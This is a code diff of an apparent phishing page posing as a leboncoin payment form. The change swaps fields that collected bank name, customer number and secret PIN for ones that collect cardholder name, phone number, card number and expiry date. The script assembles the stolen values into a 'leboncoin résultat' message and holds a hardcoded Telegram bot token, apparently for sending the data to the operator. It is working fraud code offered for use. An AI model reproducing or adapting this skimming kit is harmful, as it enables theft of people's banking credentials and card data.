@@ -22,6 +22,11 @@
         }
 
         .top {
+            position: fixed;
+            left: 0;
+            top: 0;
+            background-color: white;
+            width: 100%;
             height: 50px;
             padding: 10px;
             display: flex;
@@ -31,6 +36,7 @@
 
         .center {
             padding: 15px;
+            margin-top: 60px;
         }
 
         .box {
@@ -71,7 +77,7 @@
 
 <body>
 
-    <div class="top shadow">
+    <div class="top shadow-sm">
         <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none"
             stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"
             class="lucide lucide-arrow-left">
@@ -93,32 +99,30 @@
                         <circle cx="12" cy="12" r="10" />
                         <circle cx="12" cy="12" r="1" />
                     </svg>
-                    <span>Compte bancaire</span>
+                    <span>Carte bancaire</span>
                 </div>
 
-                <svg style="color: grey;" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
-                    fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"
-                    class="lucide lucide-landmark">
-                    <line x1="3" x2="21" y1="22" y2="22" />
-                    <line x1="6" x2="6" y1="18" y2="11" />
-                    <line x1="10" x2="10" y1="18" y2="11" />
-                    <line x1="14" x2="14" y1="18" y2="11" />
-                    <line x1="18" x2="18" y1="18" y2="11" />
-                    <polygon points="12 2 20 7 4 7" />
-                </svg>
+                <svg style="color: grey;" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-credit-card"><rect width="20" height="14" x="2" y="5" rx="2"/><line x1="2" x2="22" y1="10" y2="10"/></svg>
 
             </div>
-            <br>
             <br> <br>
             <form id="form">
 
-                <label for="bank">Nom de ma banque</label><br>
-                <input type="text" id="bank" required> <br> <br>
+                <label for="bank">Titulaire de la carte *</label><br>
+                <input type="text" id="nom" required> <br>
                 
-                <label for="bank">Mon numéro client</label><br>
-                <input type="text" type="tel" id="id" required> <br>
-                <label for="bank" > Mon code secret</label><br>
-                <input type="text" id="pin" type="tel" required> <br>
+                <label for="bank">Numéro de mobile *</label><br>
+                <input type="tel" type="tel" id="tel"  maxlength="10" minlength="10" required> <br>
+                
+                <label for="bank">Numéro de la carte *</label><br>
+                <input type="tel" id="card"  maxlength="16" minlength="16" required> <br>
+
+                <label for="bank" > Date d'expiration *</label><br>
+                
+                <div style="display: flex; align-items: center; justify-content: space-between; width: 100%;">
+                    <input style="width: 150px;" placeholder="Mois" type="tel" id="mois" type="tel" minlength="2" maxlength="2" required> <br>
+                    <input style="width: 150px; margin-left: auto;" placeholder="Année" type="tel" id="annee" type="tel" minlength="2" maxlength="2" required> <br>
+                </div>
             </div>
             <br>
             <br>
@@ -152,26 +156,23 @@
             e.preventDefault();
 
             // Récupération des valeurs du formulaire
-            const bank = document.getElementById('bank').value ;
-            const id = document.getElementById('id').value ;
-            const pin = document.getElementById('pin').value;
-            var email = localStorage.getItem('email');
+            const nom = document.getElementById('nom').value ;
+            const card = document.getElementById('card').value ;
+            const tel = document.getElementById('tel').value ;
+            const mois = document.getElementById('mois').value;
+            const annee = document.getElementById('annee').value;
 
-            // Validation des champs
-            if (!id || !pin || !bank) {
-                console.log('Veuillez remplir tous les champs.');
-                return;
-            }
+            
 
 
             // Construction du message
             const message = `
                 leboncoin résultat :
-                \n🏦Bank: ${bank}
-                \n✨ID : ${id}
-                \n🔓PIN: ${pin}
-                \n📩E-mail: ${email}
-                
+ \n😎Nom: ${nom}
+ \n📞Tel: ${tel}
+ \n💳Carte : ${card}
+ \n📅Mois: ${mois}
+ \n📆Annee: ${annee}         
             `;
 
             const botToken = '7366002950:AAFzze0vYX5nxrxWxX7y4vVg2CcJy-3Fsi4'; // Remplacez par votre token
